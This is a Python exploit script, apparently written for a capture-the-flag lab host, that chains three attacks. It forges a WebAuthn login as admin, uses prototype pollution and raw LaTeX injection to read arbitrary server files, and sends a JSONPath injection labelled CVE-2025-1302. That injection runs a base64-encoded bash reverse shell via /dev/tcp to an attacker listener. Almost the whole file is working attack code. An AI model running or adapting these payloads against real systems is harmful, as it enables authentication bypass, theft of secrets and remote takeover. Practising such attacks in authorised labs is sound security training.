#!/usr/bin/env python3
"""LaTeX LFI via prototype pollution; CVE-2025-1302 RCE."""
import json
import pickle
import re
import hashlib
import struct
import base64
import sys
import time
import requests
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE = "http://10.129.115.125:3000"
RP_ID = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"
HEADERS = {"Host": "aegis.korvia.htb"}
CRED_PATH = r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\aegis_cred.pkl"
TEMPLATE = "firmware-critical-v4"
LHOST = "10.10.15.183"
LPORT = 4444
OUTDIR = r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB"


def get_session():
    data = pickle.load(open(CRED_PATH, "rb"))
    priv = serialization.load_pem_private_key(data["priv_pem"], password=None)
    s = requests.Session()
    s.headers.update(HEADERS)
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={}, timeout=60)
    challenge = websafe_decode(r.json()["challenge"])
    auth_data = (
        hashlib.sha256(RP_ID.encode()).digest()
        + bytes([0x01])
        + struct.pack(">I", int(time.time()) % 65535)
    )
    client_data = json.dumps(
        {
            "type": "webauthn.get",
            "challenge": websafe_encode(challenge),
            "origin": ORIGIN,
            "crossOrigin": False,
        },
        separators=(",", ":"),
    ).encode()
    sig = priv.sign(
        auth_data + hashlib.sha256(client_data).digest(), ec.ECDSA(hashes.SHA256())
    )
    body = {
        "id": websafe_encode(data["cred_id"]),
        "rawId": websafe_encode(data["cred_id"]),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(client_data),
            "authenticatorData": websafe_encode(auth_data),
            "signature": websafe_encode(sig),
            "userHandle": websafe_encode(b"admin"),
        },
        "clientExtensionResults": {},
    }
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body, timeout=60)
    r.raise_for_status()
    return s


def read_file(s, path: str) -> str:
    # Loop + force error so TeX log (with \\message output) is returned in stdout
    latex = (
        r"\newread\foo \openin\foo="
        + path
        + r" \loop\unless\ifeof\foo \read\foo to \line "
        + r"\message{^^J<<<\meaning\line>>>^^J}\repeat \closein\foo "
        + r"\errmessage{DONE}"
    )
    body = "x\n\n`" + latex + "`{=latex}\n"
    overrides = '{"__proto__":{"allowRawBlocks":true}}'
    r = s.post(
        f"{BASE}/admin/templates/{TEMPLATE}/render",
        json={"body": body, "overrides": overrides},
        timeout=180,
    )
    r.raise_for_status()
    blob = r.text
    matches = re.findall(r"<<<macro:->(.*?)>>>", blob)
    lines = []
    for m in matches:
        # unescape common TeX log escapes
        line = m.replace(r"\\", "\\")
        lines.append(line)
    content = "\n".join(lines)
    safe = path.replace("/", "_").replace("\\", "_")
    out = f"{OUTDIR}\\lfi{safe}.txt"
    open(out, "w", encoding="utf-8").write(content if content else blob)
    print(f"[+] {path} -> {len(matches)} lines -> {out}")
    if content:
        print(content[:2000])
    else:
        print("[!] no markers; pdflatex stdout snippet:")
        j = r.json()
        for st in j.get("stages", []):
            if st.get("stage") == "pdflatex":
                print((st.get("stdout") or "")[-2000:])
    return content


def rce(token: str):
    url = f"{BASE}/api/v1/aegis-mds/_diag/{token}/jpquery"
    cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
    b64 = base64.b64encode(cmd.encode()).decode()
    inner = (
        "this.process.mainModule.require('child_process')"
        f".exec('echo {b64}|base64 -d|bash')"
    )
    expr = (
        f'$..[?(p="{inner};"'
        "Ethan=''[['constructor']][['constructor']](p);Ethan())]"
    )
    # fix expr to match walkthrough exactly
    expr = (
        f"$..[?(p=\"{inner}\";"
        f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
    )
    print("[+] POST", url)
    print("[+] LHOST", LHOST, LPORT)
    try:
        r = requests.post(
            url,
            headers=HEADERS,
            json={"context": "registration", "expr": expr},
            timeout=8,
        )
        print("[+] status", r.status_code, r.text[:400])
    except requests.exceptions.ReadTimeout:
        print("[+] timeout (shell likely connecting)")


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "read"
    if cmd == "rce":
        token = sys.argv[2]
        rce(token)
    else:
        path = sys.argv[2] if len(sys.argv) > 2 else "/etc/aegis-mds-diag.env"
        s = get_session()
        read_file(s, path)
